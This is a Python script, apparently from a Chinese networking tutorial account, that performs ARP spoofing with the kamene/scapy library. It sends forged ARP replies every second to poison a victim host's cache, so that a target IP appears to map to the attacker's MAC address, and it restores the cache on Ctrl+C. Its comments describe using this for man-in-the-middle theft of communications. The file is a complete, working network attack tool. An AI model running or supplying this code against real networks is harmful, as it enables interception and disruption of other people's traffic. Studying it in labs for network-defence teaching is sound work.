#!/usr/bin/env python3
#-*- coding:UTF-8 -*-
#欢迎关注微信公众号：点滴技术
#这里有靠谱、有价值的、免费分享、成长的，属于网络攻城狮的空间

import logging
logging.getLogger("kamene.runtime").setLevel(logging.ERROR)  # 清除报错

from kamene.all import *
from Tools.Get_address import get_ip_address  # 导入获取本机IP地址方法
from Tools.Get_address import get_mac_address  # 导入获取本机MAC地址方法
from ARP_Request import arp_request  # 导入之前创建的ARP请求脚本
from Tools.Scapy_iface import scapy_iface  # 获取scapy iface的名字
import time
import signal


def arp_spoof(ip_1,ip_2,ifname='ens35'):
    # 申明全局变量
    global localip, localmac, dst_1_ip , dst_1_mac, dst_2_ip , dst_2_mac , local_ifname

    #赋值到全局变量
    #dst_1_ip为被毒化ARP设备的IP地址，dst_ip_2为本机伪装设备的IP地址
    #local_ifname为攻击者使用的网口名字
    dst_1_ip, dst_2_ip, local_ifname= ip_1, ip_2, ifname

    # 获取本机IP和MAC地址，并且赋值到全局变量
    localip, localmac= get_ip_address(ifname), get_mac_address(ifname)

    # 获取被欺骗ip_1的MAC地址，真实网关ip_2的MAC地址
    dst_1_mac, dst_2_mac = arp_request(ip_1,ifname)[1], arp_request(ip_2,ifname)[1]

    # 引入信号处理机制，如果出现ctl+c（signal.SIGINT），使用sigint_handler这个方法进行处理
    signal.signal(signal.SIGINT, sigint_handler)

    while True:  # 一直攻击，直到ctl+c出现！！！
        # op=2,响应ARP
        sendp(Ether(src=localmac, dst=dst_1_mac) / ARP(op=2, hwsrc=localmac, hwdst=dst_1_mac, psrc=dst_2_ip, pdst=dst_1_ip),
              iface=scapy_iface(local_ifname),
              verbose=False)

        print("发送ARP欺骗数据包！欺骗{} , {}的MAC地址已经是我本机{}的MAC地址啦!!!".format(ip_1,ip_2,ifname))
        time.sleep(1)


# 定义处理方法
def sigint_handler(signum, frame):
    # 申明全局变量
    global localip, localmac, dst_1_ip , dst_1_mac, dst_2_ip , dst_2_mac , local_ifname

    print("\n执行恢复操作！！！")
    # 发送ARP数据包，恢复被毒化设备的ARP缓存
    sendp(Ether(src=dst_2_mac, dst=dst_1_mac) / ARP(op=2, hwsrc=dst_2_mac, hwdst=dst_1_mac, psrc=dst_2_ip, pdst=dst_1_ip),
          iface=scapy_iface(local_ifname),
          verbose=False)
    print("已经恢复 {} 的ARP缓存啦".format(dst_1_ip))
    # 退出程序，跳出while True
    sys.exit()

if __name__ == "__main__":
    # 欺骗192.168.1.101,让它认为192.168.1.102的MAC地址为本机攻击者的MAC
    #如果攻击者没有路由通信就会中断，如有路由就可以窃取双方通信的信息(所谓中间人)
    arp_spoof('192.168.1.101' , '192.168.1.102' , 'ens35')